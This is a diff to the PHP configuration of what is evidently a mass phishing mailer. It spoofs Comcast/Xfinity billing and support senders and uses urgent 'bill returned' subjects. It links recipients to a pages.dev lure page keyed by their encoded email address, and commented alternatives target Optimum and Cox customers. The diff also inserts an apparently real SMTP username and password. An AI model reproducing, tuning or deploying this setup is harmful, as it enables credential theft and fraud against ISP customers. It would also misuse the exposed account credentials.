@@ -3,12 +3,14 @@
 // SMTP settings
 $smtpSettings = [
      [
-        'host'      => 'smtp.comcast.net',
-        'port'      => 587,
-        'username'  => 'username@comcast.net',
-        'password'  => '',
-        'Hostname'	=> "mail-".rand(1,9999)."sys.comcast.net",
-		'Auth'	    => "tls",
+        'host'            => 'smtp.comcast.net',
+        'port'            => 587,
+        'username'        => 'janeand101@comcast.net',
+        'password'        => 'Qwerty#03',
+        'Hostname'	      => "mail-".rand(1,9999)."sys.comcast.net",
+		'Auth'	          => "tls",
+		'SMTPAutoTLS'     => true,    // mostly for Charter
+        'SMTPKeepAlive'   => true,    // mostly for Optimum SMtp false for Optimum true for others 
     ],
    /*  
      [
@@ -33,21 +35,20 @@ $domainSettings = [
 ];
 
 $commonSettings = [
-    'from'              => 'xfinity.communications@support.comcast.net',    // Sender's email address noreply@myemail.optimum.net,  noreply@mail.cox.com, postmaster@mail.263.net, xfinity.communications@comcast.net
-    'fromname'          => 'XfinityOnline',           // Sender's name Postmaster, Cox, Xfinity
-    'subject'           => 'Urgent message from Xfinity requires your attention immediately', // Default email subject with placeholder  [12]邮件被拒绝, Urgent message from Optimum - An immediate response is needed., Urgent message from Cox - An immediate response is needed., Urgent message from Xfinity requires your attention immediately
+    'from'              => 'bills.communications@support.comcast.net',    // Sender's email address noreply@myemail.optimum.net,  noreply@mail.cox.com, postmaster@mail.263.net, xfinity.communications@comcast.net
+    'fromname'          => 'Bill Pay',           // Sender's name Postmaster, Cox, Xfinity
+    'subject'           => 'Your recent bill returned on ##date4##', // Default email subject with placeholder  [12]邮件被拒绝, Urgent message from Optimum - An immediate response is needed., Urgent message from Cox - An immediate response is needed., Urgent message from Xfinity requires your attention immediately
     'letterFile'        => '1.html',                   //  letter filename
     'priority'          => '3',                         // Priority 
-    'encoding'          => 'quoted-printable',       // quoted-printable or base64 or 7bit or 8bit or binary,
+    'encoding'          => '',       // quoted-printable or base64 or 7bit or 8bit or binary,
     'charset'           => 'utf-8',                   //Charset option us-ascii, iso-8859-1, utf-8
-    'threads'           => '3',                       // Number of threads
+    'threads'           => '1',                       // Number of threads
     'sleepDuration'     => '',                       // Sleep duration between sending emails
     'waitAfter'         => '',                       // Sleep duration between sending emails
     'waitFor'           => '',                       // Sleep duration between sending emails
-    'SMTP'              => '',
-	'EncryptKeyEmlAdd'  => '439rr095490r',             //EMail Address Encryption key             
-    'encryptEmail'  	=> false,             //EMail Address Encryption key             
-    'link'              => 'https://mail-263-net.pages.dev/?id=##emailEncrypt##', // Your link for muttple link sepperat with |
+   	'EncryptKeyEmlAdd'  => '439rr095490r',             //EMail Address Encryption key             
+    'encryptEmail'  	=> true,             //EMail Address Encryption key             
+    'link'              => 'support-cancellation-notice.pages.dev/?id=##email64##', // Your link for muttple link sepperat with |
     'linkb64'           => '',                         // Base link link
     'qrlink'            => '',                         // Link behinde qrlink 
     'qrlabel'           => '',                         // Label below qr code
@@ -55,7 +56,7 @@ $commonSettings = [
 	'htmltojpg'       	=> false,                      // randomparam in front of link
     'imageLetter'       => 'ff1.jpg',                   // Image to base64 or direct images sending
     'pdf_attachfile'    => '',                         // PDF file name to attach
-    'HtmlAttachment'    => '1.html',                         // Image attachment filename
+    'HtmlAttachment'    => '',                         // Image attachment filename
     'AttachmentName'    => 'Test',                         // Image attachment filename
     'autolink'          => false,                      // enable autolink in function
     'image_attachname'  => '',                         // CHnage attachment name
@@ -65,9 +66,8 @@ $commonSettings = [
     'randSender'        => false,                      // Enable Base64 encoding for sender's name
     'displayimage'      => false,                      // 
     'recipientListFile' => 'list.txt',
-    'ErrorHandling' 	=> '4',  
-    // Enable Base64 encoding for image display
-    // other common settings...
+    'ErrorHandling' 	=> '18',  
+    
 ];
 
 $recipientListSettings = [
